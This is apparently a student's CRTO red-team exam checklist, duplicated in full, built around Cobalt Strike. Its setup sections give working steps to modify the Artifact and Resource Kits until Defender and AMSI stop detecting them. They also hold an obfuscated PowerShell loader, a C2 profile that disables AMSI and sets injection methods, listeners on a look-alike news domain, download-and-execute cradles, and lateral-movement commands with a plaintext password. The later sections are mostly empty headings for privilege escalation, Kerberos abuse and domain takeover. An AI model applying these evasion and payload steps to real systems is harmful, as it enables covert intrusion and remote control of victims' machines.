## Initial Setup

1.- Modify Artifact Kit
```c
/* Open C:\Tools\cobaltstrike\arsenal-kit\kits\artifact in VSCode */
/* Navigate to src-common and open patch.c. */

/* Line 45, replace for loop with while loop */
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

/* Line ~116, replace for loop with while loop */
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

```powershell
# Modify script_template.cna and replace all instances of rundll32.exe with msedge.exe
$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path) -replace 'rundll32.exe' , 'msedge.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts 

# Check Artifact kit payload against ThreatCheck
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe
	# Make note of hexcode identified, reverse via Ghidra, modify, save.

# Recompile
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

2.- Compile Resource Kit
```powershell
# Build (WSL)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

# Open C:\Tools\cobaltstrike\custom-resources in VSCode
# Select template.x64.ps1

# Line 5, replace 
.Equals('System.dll') -> .Equals('Sys'+'tem.dll')

# Line 32, replace entire line
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Save
# Test
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-resources\template.x64.ps1 -e amsi
	# Make note of code identified, open with VSCode

# Remodify
# Retest
# Repeat until...
[+] No threat found!

# Select compress.ps1
# Use Invoke-Obfuscation to create unique obfuscation, or...
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Save

# Testing (ThreatCheck no worky on this one...)
Host on Cobalt Strike a new PAYLOAD (not compress.ps1) # Do after payload creation
IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/test'))
	# See if PS errors out or not...

# Remodify
# Retest
# Repeat until no error.

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-resources\resources.cna
```

3.- Malleable C2 Setup
```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file (APPEND, not replace dingo)

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";
  set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

4.- Add scshell64
```powershell
Cobalt Strike > Script Manager > C:\Tools\SCShell\CS-BOF\scshell.cna

consider altering this too...
```

5.- Create Listeners
```
in general, i would say: 
dns -> long-haul persistence 
http/s -> post-ex 
smb -> lateral movement 
tcp-local -> priv esc
```

```powershell
Cobalt Strike > Listeners > Add

# DNS
Name: dns
Payload: Beacon DNS
DNS Hosts: cdn.bleepincomputer.com
Host Rotation Strat : round-robin
Max Retry : None
DNS Host (stager) cdn.bleepincomputer.com
Profile : Default

# HTTP
Name: http
Payload: Beacon HTTP
HTTP Hosts: www.bleepincomputer.com
HTTP Host (Stager) : www.bleepincomputer.com

# SMB
Name: smb
Payload: Beacon SMB
Pipename: TSVCPIPE-e43f18e1-5260-45d8-a674-9377b802c69d # ls \\.\pipe\
	# For realworld, consider msedge.pipe.7732 or something similar...

# TCP
Name: tcp
Payload: Beacon TCP
Port: 80
Bind to localhost: False

# TCP (local)
Name: tcp-local
Payload: Beacon TCP
Port: 1337
Bind to localhost: True
```

6.- Testing
```powershell
# Generate Payloads
Payloads > Windows Stageless Generate All Payloads # Folder: C:\Payloads

# Host 64-bit powershell payload
C:\Payloads\http_x64.ps1
URI: /test
Host: www.bleepincomputer.com

->
http://www.bleepincomputer.com:80/test

# Enable Defender RTP (ON OUR BOX OR TEST BOX)
Set-MPPreference -DisableRealTimeMonitoring $false

# Invoke powershell payload
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
	# did it work? if so, we are good

# Testing Lateral Movement (this was in lab but not sure how we can actually test this before doing it...)
beacon> make_token CONTOSO\rsteel Passw0rd! # Impersonate local admin
‌‌beacon> remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring # verify defender status
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe # change spawn process
beacon> jump psexec64 lon-ws-1 smb # jump!
```

## Initial Access

Query Defender Status
	- present on all CRTO exam

Query Applocker
	-
	Present?
		Enumerate
			

## Host-Recon

whoami (BOF of whoami /all)
	-

ipconfig
	-

`nslookup <host>` (resolves IPs and BOF)
	-

Processes `# ps / process_browser... look for user processes`
	-

## Persistence
Establish Persistence
	-

Pass Session for faster channel/post-ex commands
	-

## Post-Exploitation
Host recon stuff (TO BE CONTINUED)
	-

Post exploit stuff
	-

Medium Integrity cred access (try and wait until after priv esc for this step... see below)
	Cred from web browsers
		-
	Windows Cred Manager
		-

## Privilege Escalation

Path Interception
	PATH Env Variable `# env; Check if software paths exist BEFORE defaults`
		-
	Search Order Hijacking `# cacls; Check for write access to service executing directory`
		-
	Unquoted Service Paths `# cacls; check for services with white spaces`
		-

Weak Service Permissions
	Service File Perms `# cacls, alter and replace`
		-
	Service Registry Perms `# Modifying binary path via weak ACL`
		-

DLL Search Order Hijacking
	DLL Search Order Hijacking `# Adding a bad dll to a higher search order`
		-

Software Vulnerabilities
	Unsafe Deserialization
		-

UAC
	-

## Elevated Persistence
Schtask
	-

Windows Service
	-

## Credential Access

```
DON'T DUMP LSASS BRO
```

Medium Integrity cred access
	Cred from web browsers
		-
	Windows Cred Manager
		-

High Integrity cred access
	Kerberos `# Triage targets first`
		Targeted asreproast
			-
		Targeted kerberoast
			-
		Dump tickets from memory (does not touch LSASS :))
			-
		Renew TGTs if needed
			-

## User Impersonation

```
use token-store whenever we impersonate
```

High-Integrity
	Token Impersonation 
		-
	Process Injection
		-

Pth
	-

Ptt
	-

## Discovery

BloodHound
	BOFHound Collection
		-
	Restricted Groups
		-
	WMI Filters
		-

LDAP Queries
	-
	Kerberos stuff (in [Kerberos](#Kerberos))
		-
	MSSQL Server Identification
		if present, proceed to [MSSQL](#MSSQL)
	Domain info
		Domain SID
		-
		

## Lateral Movement

WinRM
	-

SCShell (PSExec is BAD)
	-

MavInject
	-

## Kerberos

Unconstrained Delegation
	Identification
		-
	Standard
		-
	S4U2Self Computer Takeover
		-

Constrained Delegation
	Identification
		-
	Standard
		-
	Service Name Substitution
		-

Resource Based Constrained Delegation
	-

Silver Ticket (to impersonate rather than persistence) `# NOT GOOD OPSEC...`
	-

## Pivoting

Enumerate interfaces for Internal networks
	-

SOCKS
	-

Reverse Port Forward
	-


## MSSQL

Present?
	-

Code Exec
	SQL CLR (best opsec)
		-
	OLE Automation
		-
	xp_cmdshell
		-

Linked Servers?
	-

Priv Esc
	-

## Domain Dominance

DCSync
	-

Ticket Forgery for Persistence
	Silver Ticket
		-
	Golden Ticket
		-
	Diamond Ticket (BEST OPSEC)
		-

DPAPI Backup Keys
	-

## Forest and Domain Trusts

Inter-Realm Tickets
	-

Parent Child Tickets
	-

One-Way Inbound Trusts
	-

One-Way Outbound Trusts
	-

# Lessons Learned
# Duplicate Checklist
In case I need an empty one :)

## Initial Setup

1.- Modify Artifact Kit
```c
/* Open C:\Tools\cobaltstrike\arsenal-kit\kits\artifact in VSCode */
/* Navigate to src-common and open patch.c. */

/* Line 45, replace for loop with while loop */
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

/* Line ~116, replace for loop with while loop */
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

```powershell
# Modify script_template.cna and replace all instances of rundll32.exe with msedge.exe
$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path) -replace 'rundll32.exe' , 'msedge.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts 

# Check Artifact kit payload against ThreatCheck
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe
	# Make note of hexcode identified, reverse via Ghidra, modify, save.

# Recompile
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

2.- Compile Resource Kit
```powershell
# Build (WSL)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

# Open C:\Tools\cobaltstrike\custom-resources in VSCode
# Select template.x64.ps1

# Line 5, replace 
.Equals('System.dll') -> .Equals('Sys'+'tem.dll')

# Line 32, replace entire line
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Save
# Test
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-resources\template.x64.ps1 -e amsi
	# Make note of code identified, open with VSCode

# Remodify
# Retest
# Repeat until...
[+] No threat found!

# Select compress.ps1
# Use Invoke-Obfuscation to create unique obfuscation, or...
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Save

# Testing (ThreatCheck no worky on this one...)
Host on Cobalt Strike a new PAYLOAD (not compress.ps1) # Do after payload creation
IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/test'))
	# See if PS errors out or not...

# Remodify
# Retest
# Repeat until no error.

# Load into Cobalt Strike
C:\Tools\cobaltstrike\resources\resources.cna
```

3.- Malleable C2 Setup
```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file (APPEND, not replace dingo)

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

4.- Create Listeners
```powershell
Cobalt Strike > Listeners > Add

# HTTP
Name: http
Payload: Beacon HTTP
HTTP Hosts: www.bleepincomputer.com
HTTP Host (Stager) : www.bleepincomputer.com

# SMB
Name: smb
Payload: Beacon SMB
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337  # > ls \\.\pipe\
	# For realworld, consider msedge.pipe.7732 or something similar...

# TCP
Name: tcp
Payload: Beacon TCP
Port: 4444
Bind to localhost: False

# TCP (local)
Name: tcp-local
Payload: Beacon TCP
Port: 1337
Bind to localhost: True
```

5.- Testing
```powershell
# Generate Payloads
Payloads > Windows Stageless Generate All Payloads # Folder: C:\Payloads

# Host 64-bit powershell payload
C:\Payloads\http_x64.ps1
URI: /test
Host: www.bleepincomputer.com

# Enable Defender RTP (ON OUR BOX OR TEST BOX)
Set-MPPreference -DisableRealTimeMonitoring $false

# Invoke powershell payload
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
	# did it work? if so, we are good

# Testing Lateral Movement (this was in lab but not sure how we can actually test this before doing it...)
beacon> make_token CONTOSO\rsteel Passw0rd! # Impersonate local admin
‌‌beacon> remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring # verify defender status
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe # change spawn process
beacon> jump psexec64 lon-ws-1 smb # jump!
```

## Initial Access

Query Defender Status
	- present on all CRTO exam

Query Applocker
	-

## Host-Recon

getuid
	-

Processes `# ps / process_browser... look for user processes`
	-

## Persistence
Establish Persistence
	-

Pass Session for faster channel/post-ex commands
	-

## Post-Exploitation
Host recon stuff (TO BE CONTINUED)
	-

Post exploit stuff
	-

Medium Integrity cred access (try and wait until after priv esc for this step... see below)
	Cred from web browsers
		-
	Windows Cred Manager
		-

## Privilege Escalation

Path Interception
	PATH Env Variable `# env; Check if software paths exist BEFORE defaults`
		-
	Search Order Hijacking `# cacls; Check for write access to service executing directory`
		-
	Unquoted Service Paths `# cacls; check for services with white spaces`
		-

Weak Service Permissions
	Service File Perms `# cacls, alter and replace`
		-
	Service Registry Perms `# Modifying binary path via weak ACL`
		-

DLL Search Order Hijacking
	DLL Search Order Hijacking `# Adding a bad dll to a higher search order`
		-

Software Vulnerabilities
	Unsafe Deserialization
		-

UAC
	-

## Elevated Persistence
Schtask
	-

Windows Service
	-

## Credential Access

```
DON'T DUMP LSASS BRO
```

Medium Integrity cred access
	Cred from web browsers
		-
	Windows Cred Manager
		-

High Integrity cred access
	Kerberos `# Triage targets first`
		Targeted asreproast
			-
		Targeted kerberoast
			-
		Dump tickets from memory (does not touch LSASS :))
			-
		Renew TGTs if needed
			-

## User Impersonation

```
use token_store whenever we impersonate
```

High-Integrity
	Token Impersonation 
		-
	Process Injection
		-

Pth
	-

Ptt
	-

## Discovery

BloodHound
	BOFHound Collection
		-
	Restricted Groups
		-
	WMI Filters
		-

LDAP Queries
	-
	Kerberos stuff (in [Kerberos](#Kerberos))
		-
	MSSQL Server Identification
		if present, proceed to [MSSQL](#MSSQL)

## Lateral Movement

WinRM
	-

SCShell (PSExec is BAD)
	-

MavInject
	-

## Kerberos

Unconstrained Delegation
	Identification
		-
	Standard
		-
	S4U2Self Computer Takeover
		-

Constrained Delegation
	Identification
		-
	Standard
		-
	Service Name Substitution
		-

Resource Based Constrained Delegation
	-

Silver Ticket (to impersonate rather than persistence) `# NOT GOOD OPSEC...`
	-

## Pivoting

Enumerate interfaces for Internal networks
	-

SOCKS
	-

Reverse Port Forward
	-


## MSSQL

Present?
	-

Code Exec
	-

Linked Servers?
	-

Priv Esc
	-

## Domain Dominance

DCSync
	-

Ticket Forgery for Persistence
	Silver Ticket
		-
	Golden Ticket
		-
	Diamond Ticket (BEST OPSEC)
		-

DPAPI Backup Keys
	-

## Forest and Domain Trusts

Inter-Realm Tickets
	-

Parent Child Tickets
	-

One-Way Inbound Trusts
	-

One-Way Outbound Trusts
	-